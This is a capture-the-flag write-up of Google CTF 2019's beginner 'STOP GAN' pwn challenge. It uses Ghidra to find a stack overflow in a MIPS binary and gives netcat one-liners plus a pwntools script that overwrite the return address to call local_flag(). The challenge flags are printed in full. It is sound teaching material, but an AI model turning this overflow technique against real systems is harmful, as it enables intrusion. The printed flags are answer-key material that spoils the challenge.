---
title: "Google CTF 2019 – Beginner’s Quest: STOP GAN (pwn)"
classes: wide
header:
  teaser: /assets/images/ctf-writeups/stop-gan-google-ctf.jpg

ribbon: blue
description: "Hey folks, we got back with a nice and straightforward challenge from Google CTF beginner’s quest and it is from the (pwn) category."
categories:
  - CTF Writeups
---

Hey folks, we got back with a nice and straightforward challenge from Google CTF beginner’s quest and it is from the (pwn) category.

**Download Challenge** : [https://storage.googleapis.com/gctf-2019-attachments/4a8becb637ed2b45e247d482ea9df123eb01115fc33583c2fa0e4a69b760af4a](https://storage.googleapis.com/gctf-2019-attachments/4a8becb637ed2b45e247d482ea9df123eb01115fc33583c2fa0e4a69b760af4a)

## Challenge Description:

![https://bufferoverflows.net/wp-content/uploads/2019/07/Selection_114.jpg](https://bufferoverflows.net/wp-content/uploads/2019/07/Selection_114.jpg)

Success, you’ve got the picture of your lost love, not knowing that pictures and the things you take pictures of are generally two separate things, you think you’ve rescued them and their brethren by downloading them all to your ships hard drive. They’re still being eaten, but this is a fact that has escaped you entirely. 

Your thoughts swiftly shift to revenge. 

It’s important now to stop this program from destroying these “Cauliflowers” as they’re referred to, ever again.

**buffer-overflow.ctfcompetition.com 1337**

After downloading and extracting the challenge files from the ZIP archive, we got two files

![https://bufferoverflows.net/wp-content/uploads/2019/07/Selection_113.jpg](https://bufferoverflows.net/wp-content/uploads/2019/07/Selection_113.jpg)

### Challenge Files

As usual try to figure out the type of the files

![https://bufferoverflows.net/wp-content/uploads/2019/07/Selection_115-1.jpg](https://bufferoverflows.net/wp-content/uploads/2019/07/Selection_115-1.jpg)

bof : is an 32-bit executable but it is not the usual Intel architecture but it is MIPS (little endian)

Let’s get a look at **console.c**

```c
#include <stdio.h>

#include <stdlib.h>

#include <string.h>

#include <unistd.h>

/**

* 6e: bufferflow triggering segfault  - binary, compile with:

* gcc /tmp/console.c -o /tmp/console -static -s

*

* Console allows the player to get info on the binary.

* Crashing bof will trigger the 1st flag.

* Controlling the buffer overflow in bof will trigger the 2nd flag.

*/

int main() {

	setbuf(stdin, NULL);
	
	setbuf(stdout, NULL);
	
	setbuf(stderr, NULL);
	
	char inputs[256];
	
	printf("Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using 'run' command.\n Bonus flag for controlling the crash.\n");
	
	while(1) {
	
	printf("\nConsole commands: \nrun\nquit\n>>");
	
	if (fgets(inputs, 256, stdin) == NULL) {
	
		exit(0);
	
	}
	
	printf("Inputs: %s", inputs);
	
	if ( strncmp(inputs, "run\n\0", 256) == 0 ) {
	
		int result = system("/usr/bin/qemu-mipsel-static ./bof");
	
		continue;
	
	} else if ( strncmp(inputs, "quit\n\0", 256) == 0 ) {
	
		exit(0);
	
	} else {
	
	puts("Unable to determine action from your input");
	
		exit(0);
	
	}
	
	}
	
	return 0;
	
}
```

So, after reading the **console.c** file we figured out that it is not the source code of the **bof** file but rather it has some hints about buffer overflows, the compilation of the **bof** and our goal is to crash the Cauliflower system by providing input to it using ‘run’ command to get the Flag and after that we can continue to get the Bonus Flag.

To get an idea what is the functionality of **bof** executable, I will use **Ghidra** to de-compile it and luckily Ghidra supports decompilation of multiple architectures including  **MIPS**.

![Decompilation of main() in Ghidra](https://bufferoverflows.net/wp-content/uploads/2019/07/Selection_117-1.jpg)

Decompilation of main() in Ghidra

Let’s connect to the server

`nc -v buffer-overflow.ctfcompetition.com 1337`

![https://bufferoverflows.net/wp-content/uploads/2019/07/Selection_118-1024x336.jpg](https://bufferoverflows.net/wp-content/uploads/2019/07/Selection_118-1024x336.jpg)

### Connecting to the server

To crash the system we should provide it with input more than the available space to overwrite the stack and resulting in a segfault. 

From decompilation of the **main()** in the picture above, we knew that the space available for our input is **260 bytes** and more than that the program will crash.

Let’s start with 300 bytes long input

`python -c 'print "run\n" + "A"*300' | nc -v buffer-overflow.ctfcompetition.com 1337`

![https://bufferoverflows.net/wp-content/uploads/2019/07/Selection_119-1024x338.jpg](https://bufferoverflows.net/wp-content/uploads/2019/07/Selection_119-1024x338.jpg)

### Crashing the system

**Flag1** : **CTF{Why_does_cauliflower_threaten_us}**

Now our mission is to control the crash (most probably to print the Bonus Flag) as the program is telling us.

In Ghidra we can search the functions of **bof** for the word “flag”

![https://bufferoverflows.net/wp-content/uploads/2019/07/Selection_120-1.jpg](https://bufferoverflows.net/wp-content/uploads/2019/07/Selection_120-1.jpg)

Search results in Ghidra for the string “flag”

After knowing what function we want to execute after getting control of the program, we should calculate the exact length of our payload that caused the crash and then get control of the return address.

After trying a little bit with the length of our payload, I found that the system crashes after entering **264 of A’s** so now we know that the address of the function local_flag() should be placed after 264 of A’s.

`python -c 'print "run\n" + "A"*(260+4)+"\x50\x08\x40\x00"' | nc -v buffer-overflow.ctfcompetition.com 1337`

![https://bufferoverflows.net/wp-content/uploads/2019/07/Selection_121-1024x333.jpg](https://bufferoverflows.net/wp-content/uploads/2019/07/Selection_121-1024x333.jpg)

### Controlling the crash and executing local_flag()

**Flag2** : **CTF{controlled_crash_causes_conditional_correspondence}**

Done? not yet, Automation FTW!

Let’s build a python script to automate getting the flags for us

```python
from pwn import *

import re

# Connection Information

HOST = "buffer-overflow.ctfcompetition.com"

PORT = 1337

# Initial Payload

payload = "A" * 264

# This function get the first flag by crashing the system

def get_flag1(conn, payload):

conn.sendline("run\n")

payload += 4 * "A"

conn.sendline(payload)

flag = conn.recvuntil("}")

flag = re.findall("CTF{.*}", flag)[0]

conn.close()

return flag

# This function get the second flag

# by controlling the execution and execution local_flag() function

def get_flag2(conn, payload):

conn.sendline("run\n")

payload += p32(0x00400850) # address of local_flag() function

conn.sendline(payload)

flag = conn.recvuntil("}")

flag = re.findall("CTF{.*}", flag)[0]

conn.close()

return flag

# Connect first time

conn = remote(HOST, PORT)

flag1 = get_flag1(conn, payload)

print flag1

# Saving first flag in a file named "flags.txt"

with open("flags.txt", 'w') as f:

f.write("First Flag : " + flag1 + "\n\n")

# Connect second time

conn = remote(HOST, PORT)

flag2 = get_flag2(conn, payload)

print flag2

# Saving second flag in the "flags.txt file"

with open("flags.txt", 'a') as f:

f.write("Bonus Flag : " + flag2 + "\n\n")
```

![https://bufferoverflows.net/wp-content/uploads/2019/07/Selection_122-1024x291.jpg](https://bufferoverflows.net/wp-content/uploads/2019/07/Selection_122-1024x291.jpg)

Now we got the flags the right way